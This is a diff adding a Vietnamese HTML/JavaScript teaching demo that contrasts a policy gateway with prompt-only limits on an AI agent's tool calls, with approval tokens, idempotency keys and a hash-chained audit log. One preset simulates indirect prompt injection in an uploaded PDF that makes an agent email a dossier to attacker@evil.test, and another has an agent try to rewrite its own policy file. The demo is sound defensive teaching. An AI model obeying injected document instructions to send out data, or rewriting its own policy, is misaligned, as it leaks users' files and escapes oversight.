@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>S2-5 · Action boundary demo</title>
+<style>
+  :root{
+    --blue:#003E7E; --blue-l:#0078BE; --gray:#F2F5F9; --line:#D6DEE9;
+    --green:#14832B; --green-bg:#E8F5EA;
+    --orange:#DC6400; --orange-bg:#FFF2E3;
+    --red:#B41E1E; --red-bg:#FBE9E9;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+       background:var(--gray);color:#16324F}
+  header{background:var(--blue);color:#fff;padding:14px 22px;display:flex;
+         align-items:center;gap:18px;flex-wrap:wrap}
+  header h1{font-size:17px;margin:0;font-weight:700;letter-spacing:.2px}
+  header .sub{font-size:12px;opacity:.85}
+  header .spacer{flex:1}
+  header button{background:#ffffff22;color:#fff;border:1px solid #ffffff55;
+                padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px}
+  header button:hover{background:#ffffff33}
+  main{display:grid;grid-template-columns:minmax(310px,.95fr) minmax(360px,1.05fr);
+       gap:16px;padding:16px 22px 26px;max-width:1500px;margin:0 auto}
+  .panel{background:#fff;border:1px solid var(--line);border-radius:10px;padding:14px 16px}
+  .panel h2{font-size:12px;text-transform:uppercase;letter-spacing:.08em;color:#5A7089;
+            margin:0 0 10px}
+  label{display:block;font-size:12px;color:#4A6076;margin:8px 0 4px}
+  select,input,textarea{width:100%;padding:7px 9px;border:1px solid var(--line);
+      border-radius:6px;font-size:13px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
+      background:#fff;color:#16324F}
+  textarea{min-height:64px;resize:vertical}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  .chips{display:flex;gap:8px;flex-wrap:wrap;margin-top:4px}
+  .chip{font-size:12px;border:1px solid var(--line);border-radius:999px;padding:5px 10px;
+        cursor:pointer;user-select:none;background:#fff}
+  .chip.on{background:var(--blue);color:#fff;border-color:var(--blue)}
+  .presets{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px}
+  .presets button{font-size:11.5px;padding:6px 10px;border-radius:6px;cursor:pointer;
+      border:1px solid var(--blue-l);color:var(--blue);background:#EEF6FC}
+  .presets button:hover{background:#DCEDF9}
+  .actions{display:flex;gap:8px;margin-top:12px;flex-wrap:wrap}
+  .primary{background:var(--blue);color:#fff;border:0;padding:10px 16px;border-radius:6px;
+           font-size:13px;font-weight:600;cursor:pointer}
+  .ghost{background:#fff;color:var(--blue);border:1px solid var(--blue);padding:10px 14px;
+         border-radius:6px;font-size:13px;cursor:pointer}
+  .badge{display:inline-block;padding:10px 18px;border-radius:8px;font-weight:800;
+         font-size:20px;letter-spacing:.04em}
+  .ALLOW{background:var(--green-bg);color:var(--green);border:1px solid #B7DDBE}
+  .REQUIRE_APPROVAL{background:var(--orange-bg);color:var(--orange);border:1px solid #F3CFA6}
+  .DENY{background:var(--red-bg);color:var(--red);border:1px solid #EDBDBD}
+  .REPLAY{background:#E8F0FA;color:var(--blue-l);border:1px solid #BFD8EE}
+  .reason{font-size:14px;margin-top:10px;line-height:1.45}
+  .meta{font-size:12px;color:#5A7089;margin-top:6px;font-family:ui-monospace,Menlo,monospace}
+  .compare{margin-top:12px;padding:10px 12px;border-left:3px solid var(--orange);
+           background:#FFFBF6;font-size:12.5px;border-radius:0 6px 6px 0}
+  .compare b{color:var(--orange)}
+  table{width:100%;border-collapse:collapse;font-size:11px;margin-top:6px;table-layout:fixed;
+        font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+  th,td{text-align:left;padding:5px 6px;border-bottom:1px solid #EDF1F6;vertical-align:top;
+        overflow-wrap:anywhere}
+  th{color:#5A7089;font-weight:600;font-size:10.5px;text-transform:uppercase;letter-spacing:.05em}
+  .pill{font-size:10.5px;padding:2px 7px;border-radius:999px;font-weight:700}
+  .pill.ALLOW{background:var(--green-bg);color:var(--green)}
+  .pill.REQUIRE_APPROVAL{background:var(--orange-bg);color:var(--orange)}
+  .pill.DENY{background:var(--red-bg);color:var(--red)}
+  .hint{font-size:11.5px;color:#6B8199;margin-top:8px;line-height:1.4}
+  code{background:#F4F7FB;padding:1px 5px;border-radius:4px;font-size:11.5px}
+  .err{color:var(--red);font-size:12px;margin-top:8px}
+</style>
+</head>
+<body>
+<header>
+  <div>
+    <h1>S2-5 · Action boundary — prompt hay gateway?</h1>
+    <div class="sub">Cùng một request, hai cách “ép” ranh giới. Gateway đọc policy, không đọc lời hứa của model.</div>
+  </div>
+  <div class="spacer"></div>
+  <button id="reset">↺ reset audit</button>
+</header>
+
+<main>
+  <section class="panel">
+    <h2>1 · Dựng request</h2>
+
+    <div class="row">
+      <div>
+        <label>Agent (identity + credential)</label>
+        <select id="agent">
+          <option value="lawgraph">lawgraph · db_ro_lawgraph</option>
+          <option value="auditor">auditor · db_ro_validity</option>
+          <option value="drafter">drafter · cred = none</option>
+          <option value="executor">executor · svc_executor</option>
+        </select>
+      </div>
+      <div>
+        <label>Công cụ (tool)</label>
+        <select id="tool">
+          <option>graph_read</option>
+          <option>validity_lookup</option>
+          <option>clause_exists</option>
+          <option>file_emit</option>
+          <option selected>email_send</option>
+          <option>http_post</option>
+          <option>db_write_status</option>
+          <option>policy_update</option>
+        </select>
+      </div>
+    </div>
+
+    <label>Tham số (JSON)</label>
+    <textarea id="args">{"to": "khach@example.com", "body": "dossier"}</textarea>
+
+    <label>Nguồn của chỉ thị (origin)</label>
+    <div class="chips" id="origins">
+      <span class="chip on" data-v="user">user</span>
+      <span class="chip" data-v="upload">upload:*.pdf</span>
+      <span class="chip" data-v="web">web:*</span>
+      <span class="chip" data-v="email">email:*</span>
+    </div>
+    <div class="hint">Chọn <code>upload</code> để mô phỏng indirect prompt injection trong tài liệu người dùng tải lên.</div>
+
+    <div class="row">
+      <div>
+        <label>Approval token</label>
+        <input id="token" placeholder="(chưa có)" />
+      </div>
+      <div>
+        <label>Idempotency key</label>
+        <input id="idem" placeholder="(trống = không dedupe)" />
+      </div>
+    </div>
+
+    <div class="actions">
+      <button class="primary" id="send">Gửi request →</button>
+      <button class="ghost" id="approve">Cấp token cho payload này</button>
+      <button class="ghost" id="tamper">Đổi payload sau khi duyệt</button>
+    </div>
+
+    <div class="presets">
+      <button data-p="c0">① C0 · đọc corpus</button>
+      <button data-p="inject">② Injection trong PDF</button>
+      <button data-p="c2">③ C2 · chưa duyệt</button>
+      <button data-p="c2ok">④ C2 · token hợp lệ</button>
+      <button data-p="retry">⑤ Retry cùng key</button>
+      <button data-p="c3">⑥ C3 · ghi trạng thái</button>
+      <button data-p="c4">⑦ C4 · tự sửa policy</button>
+      <button data-p="drafter">⑧ drafter gửi mail?</button>
+    </div>
+  </section>
+
+  <section class="panel">
+    <h2>2 · Quyết định (do code, không do model)</h2>
+    <div id="badge" class="badge ALLOW">—</div>
+    <div class="reason" id="reason">Chọn một preset hoặc bấm “Gửi request”.</div>
+    <div class="meta" id="meta"></div>
+    <div class="compare" id="compare" style="display:none"></div>
+
+    <h2 style="margin-top:18px">Audit trail (hash chain)</h2>
+    <table>
+      <thead>
+        <tr><th style="width:5%">#</th><th style="width:26%">agent / tool</th>
+            <th style="width:17%">quyết định</th><th style="width:30%">lý do</th>
+            <th style="width:22%">hash ← prev</th></tr>
+      </thead>
+      <tbody id="audit"></tbody>
+    </table>
+    <div class="hint">Mỗi dòng băm cả dòng trước ⇒ sửa một dòng là gãy chuỗi. Đây là “attributability” ở practice #6.</div>
+  </section>
+</main>
+
+<script>
+const $ = s => document.querySelector(s);
+const api = (p, body) => fetch(p, {
+  method: "POST", headers: {"Content-Type": "application/json"},
+  body: JSON.stringify(body || {})
+}).then(r => r.json());
+
+const state = { origin: ["user"] };
+
+/* origin chips */
+$("#origins").addEventListener("click", e => {
+  const chip = e.target.closest(".chip");
+  if (!chip) return;
+  chip.classList.toggle("on");
+  state.origin = [...document.querySelectorAll("#origins .chip.on")].map(c => c.dataset.v);
+  if (!state.origin.length) { state.origin = ["user"]; }
+  syncOrigin();
+});
+function syncOrigin(){
+  document.querySelectorAll("#origins .chip").forEach(c => {
+    if (c.dataset.v === "user" && state.origin.length > 1) c.classList.remove("on");
+  });
+  state.origin = state.origin.filter(v => v !== "user" || state.origin.length === 1);
+  document.querySelectorAll("#origins .chip").forEach(c => {
+    c.classList.toggle("on", state.origin.includes(c.dataset.v));
+  });
+}
+
+function payload(){
+  let args = {};
+  try { args = JSON.parse($("#args").value || "{}"); }
+  catch (e) { throw new Error("JSON tham số không hợp lệ: " + e.message); }
+  return {
+    agent: $("#agent").value,
+    tool: $("#tool").value,
+    args,
+    origin: state.origin,
+    approval_token: $("#token").value.trim() || null,
+    idempotency_key: $("#idem").value.trim() || null
+  };
+}
+
+function renderAudit(rows){
+  $("#audit").innerHTML = (rows || []).map((e, i) =>
+    `<tr><td>${i + 1}</td>
+      <td>${e.agent}/${e.tool}</td>
+      <td><span class="pill ${e.decision}">${e.decision}${e.replayed ? "·replay" : ""}</span></td>
+      <td>${e.reason}</td>
+      <td>${e.hash} ← ${e.prev}</td></tr>`).join("");
+}
+
+async function send(extra){
+  let body;
+  try { body = Object.assign(payload(), extra || {}); }
+  catch (e) { $("#reason").textContent = e.message; $("#badge").className = "badge DENY";
+              $("#badge").textContent = "LỖI"; return null; }
+
+  const [gw, pt] = await Promise.all([
+    api("/api/decide", {...body, mode: "gateway"}),
+    api("/api/decide", {...body, mode: "prompt"})
+  ]);
+
+  $("#badge").className = "badge " + (gw.replayed ? "REPLAY" : gw.kind);
+  $("#badge").textContent = gw.replayed ? "ALLOW · replay" : gw.kind;
+  $("#reason").textContent = gw.reason;
+  $("#meta").textContent =
+    `class ${gw.tool_class || "?"} · payload hash ${gw.args_hash || ""}`
+    + (gw.replayed ? " · replayed (không có side effect thứ hai)" : "");
+  $("#compare").style.display = "block";
+  $("#compare").innerHTML = `Cùng request ở chế độ <b>prompt-only</b>: <b>${pt.kind}</b> — `
+    + `“${pt.reason}”. Đây là toàn bộ khác biệt giữa một lời hứa và một ranh giới.`;
+  renderAudit(gw.audit);
+  return gw;
+}
+
+/* buttons */
+$("#send").onclick = () => send();
+
+$("#approve").onclick = async () => {
+  let body;
+  try { body = payload(); } catch (e) { $("#reason").textContent = e.message; return; }
+  const r = await api("/api/approve", { tool: body.tool, args: body.args });
+  $("#token").value = r.token;
+  $("#reason").textContent = "Đã cấp token gắn với hash của payload hiện tại (TTL 24h).";
+};
+
+$("#tamper").onclick = () => {
+  const box = $("#args");
+  try {
+    const a = JSON.parse(box.value || "{}");
+    a.body = (a.body || "dossier") + " + nội dung bị thay đổi";
+    box.value = JSON.stringify(a);
+    $("#reason").textContent =
+      "Payload đã bị đổi SAU khi duyệt — bấm “Gửi request” để thấy token cũ bị từ chối.";
+  } catch { $("#reason").textContent = "JSON tham số không hợp lệ."; }
+};
+
+$("#reset").onclick = async () => {
+  await api("/api/reset", {});
+  renderAudit([]); $("#badge").className = "badge ALLOW"; $("#badge").textContent = "—";
+  $("#reason").textContent = "Audit đã reset."; $("#meta").textContent = "";
+  $("#compare").style.display = "none"; $("#token").value = "";
+};
+
+/* presets */
+const PRESETS = {
+  c0: () => { $("#agent").value="lawgraph"; $("#tool").value="graph_read";
+              $("#args").value=JSON.stringify({q:"điều kiện hoàn thuế", k:8});
+              setOrigin(["user"]); $("#token").value=""; $("#idem").value=""; return send(); },
+  inject: () => { $("#agent").value="executor"; $("#tool").value="email_send";
+              $("#args").value=JSON.stringify({to:"attacker@evil.test", body:"hồ sơ đính kèm"});
+              setOrigin(["upload"]); $("#token").value=""; $("#idem").value=""; return send(); },
+  c2: () => { $("#agent").value="executor"; $("#tool").value="email_send";
+              $("#args").value=JSON.stringify({to:"khach@example.com", body:"dossier"});
+              setOrigin(["user"]); $("#token").value=""; $("#idem").value=""; return send(); },
+  c2ok: async () => { $("#agent").value="executor"; $("#tool").value="email_send";
+              $("#args").value=JSON.stringify({to:"khach@example.com", body:"dossier"});
+              setOrigin(["user"]); $("#idem").value="job-42";
+              let b; try { b = payload(); } catch { return; }
+              const r = await api("/api/approve", {tool:b.tool, args:b.args});
+              $("#token").value = r.token; return send(); },
+  retry: async () => { await PRESETS.c2ok(); return send(); },
+  c3: () => { $("#agent").value="executor"; $("#tool").value="db_write_status";
+              $("#args").value=JSON.stringify({clause:"52/2024", status:"expired"});
+              setOrigin(["user"]); $("#token").value=""; $("#idem").value=""; return send(); },
+  c4: () => { $("#agent").value="executor"; $("#tool").value="policy_update";
+              $("#args").value=JSON.stringify({file:"action_policy.yaml"});
+              setOrigin(["user"]); $("#token").value=""; $("#idem").value=""; return send(); },
+  drafter: () => { $("#agent").value="drafter"; $("#tool").value="email_send";
+              $("#args").value=JSON.stringify({to:"khach@example.com", body:"dossier"});
+              setOrigin(["user"]); $("#token").value=""; $("#idem").value=""; return send(); }
+};
+function setOrigin(list){
+  state.origin = list;
+  document.querySelectorAll("#origins .chip").forEach(c =>
+    c.classList.toggle("on", list.includes(c.dataset.v)));
+}
+document.querySelector(".presets").addEventListener("click", e => {
+  const b = e.target.closest("button[data-p]"); if (!b) return;
+  PRESETS[b.dataset.p]();
+});
+</script>
+</body>
+</html>
